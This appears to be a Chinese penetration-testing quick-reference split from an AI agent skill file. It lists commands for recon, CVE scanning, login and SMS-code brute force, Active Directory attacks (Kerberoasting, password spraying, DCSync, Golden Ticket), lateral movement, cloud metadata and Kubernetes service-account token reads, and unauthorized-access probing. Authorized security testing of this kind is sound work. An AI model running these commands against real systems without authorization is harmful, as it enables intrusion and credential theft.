# 专项场景速查（quickstarts）

> 来源：jiejieskill SKILL.md 拆分（2026-08-11）。由 SKILL.md 相应章节按需加载。

## 十、专项场景速查

### 10.1 资产探测快速启动
```bash
# 一站式：域名 → 子域 → 存活 → 指纹 → 端口 → 小程序
subfinder -d target.com -silent | httpx -silent -status-code -title -tech-detect > live.txt
nmap -sS -p- -T4 -iL domains.txt 2>/dev/null | tee ports.txt
ffuf -u https://target.com/FUZZ -w raft-large-words.txt -t 100
# 小程序：抓 wxapkg → wedecode 反编译（详见资产探测章节）
# 分类处置：Web→本skill / 小程序→wxmini / App→app-pentest / 金融→业务逻辑+国密
```

### 10.2 版本指纹 → CVE 快速启动
```bash
# 指纹 → 版本 → CVE 模板 一条线（详见 `recon.md` 4.5）
httpx -l targets.txt -tech-detect -json -o tech.json
nuclei -l targets.txt -t cves/ -severity critical,high -o cve-results.txt
nuclei -l targets.txt -as                # 按指纹自动选模板
# 定向：nuclei -u $URL -tags tomcat,apache,nginx,spring -t cves/
# 命中版本后先 dnslog/响应差异确认，授权内再利用
```

### 10.3 认证 / 爆破快速启动
```bash
# 登录爆破（先确认授权与限流）
hydra -L users.txt -P top500.txt target http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
# 短信验证码爆破（测试手机号 <测试手机号>）
#   Burp 定位 sendSms 接口 → Intruder 遍历 000000-999999 → 验证码回显/万能码/未绑定
# 注册枚举 → 登录枚举 → 找回密码跳步/篡改 → 改密越权
# 详见「认证全流程测试」章节
```

### 10.4 Web 应用测试快速启动
```bash
# 第1步：爬虫 + 目录扫描（并行）
gobuster dir -u $URL -w big.txt -x php,html,txt -t 50 &
ffuf -u $URL/api/FUZZ -w api-wordlist.txt -t 50 &
nikto -h $URL &

# 第2步：Burp Suite 代理，手工浏览 + 自动扫描
# → 重点：登录/注册/密码重置/文件上传/支付流程

# 第3步：参数发现
# Arjun / paramspider / x8
arjun -u $URL -t 20

# 第4步：反射点测试 → XSS/注入
# Burp Repeater 逐个参数测试

# 第5步：Nuclei 全量扫描
nuclei -u $URL -t cves/ -t exposures/ -t misconfiguration/ -severity critical,high,medium
```

### 10.5 内网渗透快速启动
```bash
# 获取立足点后：
# 1. 信息收集
whoami && ipconfig /all && netstat -ano
net user /domain && net group "Domain Admins" /domain
ip a && ss -tulpn && arp -a

# 2. 网络扫描
# 上传静态编译的 nmap 或使用 /bin/bash TCP ping
for i in {1..254}; do (ping -c 1 10.0.0.$i | grep "bytes from" &); done

# 3. BloodHound
bloodhound-python -d domain.local -u user -p pass -ns <DC_IP> -c All

# 4. Responder 监听（后台）
responder -I <interface> -A

# 5. Kerberoasting
GetUserSPNs.py domain.local/user:pass -request -outputfile kerb.txt

# 6. 密码喷射
crackmapexec smb <CIDR> -u users.txt -p 'Spring2025!' --continue-on-success

# 7. 横向移动
crackmapexec smb <CIDR> -u user -p pass -x "whoami"
impacket-psexec domain.local/user:pass@target
```

### 10.6 AD 域渗透路径
```
标准攻击路径：
获取域用户凭据
  → BloodHound 分析攻击路径
    → Kerberoasting / AS-REP Roasting
      → 破解服务账户密码
        → 横向移动到关键服务器
          → 寻找 Domain Admin session
            → 窃取令牌或凭据
              → DCSync / 登录域控
                → 导出 NTDS.dit
                  → Golden Ticket 持久化
```

### 10.7 云环境重点关注
```bash
# AWS
aws sts get-caller-identity
aws s3 ls                              # S3 buckets
aws ec2 describe-instances             # EC2
aws iam list-roles                     # IAM
# 元数据: 169.254.169.254

# 阿里云
curl http://100.100.100.200/latest/meta-data/
# 实例元数据、RAM角色凭据

# Kubernetes
kubectl get pods --all-namespaces
kubectl get secrets
# 检查 service account token 挂载
cat /var/run/secrets/kubernetes.io/serviceaccount/token
# 容器逃逸: privileged, hostPID, hostNetwork, mount docker socket
```

### 10.8 中间件 / 框架快速排查
```bash
# 一键流程：指纹 → 版本 → 对应 exploit → 验证
# 1. 指纹识别
httpx -u $URL -tech-detect -status-code        # 一键技术栈+状态码
whatweb $URL / wappalyzer（浏览器插件）

# 2. 常见中间件快速指纹
curl -sI $URL | grep -i remember               # 响应头 rememberMe=deleteMe → Shiro
curl -s $URL/actuator/env | head -5             # 200 → Spring Boot Actuator 泄露
curl -s -X POST $URL -H "Content-Type: application/json" -d '{"@type":"java.lang.Class"}' | grep -i error   # Fastjson
# 响应头/页面特征：Server、X-Powered-By、报错页、登录框 → 识别 OA/中间件

# 3. 命中版本 → 检索 exploit
searchsploit <product> <version>
nuclei -u $URL -t http/vulnerabilities/ -t http/exploits/ -t cves/
fscan -h $URL -o out.txt                        # 综合：常见中间件+未授权 一起打
# 工具：shiro_attack（Shiro）、JNDIExploit（Fastjson/Log4j2）、weblogicScan
```

### 10.9 未授权访问批量检测
```bash
# 高价值端口：6379 27017 9200 2375 8088 2181 11211 5984 3000 5000 873 2049
# 1. fscan 一键（推荐，内置未授权探测）
fscan -h targets.txt -np -nobr -p 6379,27017,9200,2375,8088,2181,11211,5984,3000,5000

# 2. 手工 banner 探测脚本思路
for ip in $(cat ip.txt); do
  timeout 3 bash -c "echo 'info' | nc -w2 $ip 6379" | grep -qi 'redis_version' \
    && echo "$ip:6379 Redis 未授权"; 
  timeout 3 curl -s http://$ip:2375/version | grep -qi '"ApiVersion"' \
    && echo "$ip:2375 Docker API 未授权"
done

# 3. nuclei 专项模板
nuclei -l targets.txt -t exposures/configs/ -t misconfiguration/ -t default-logins/
# 4. 验证利用：见 6.11 表 + 8.10 数据库提权
```

---

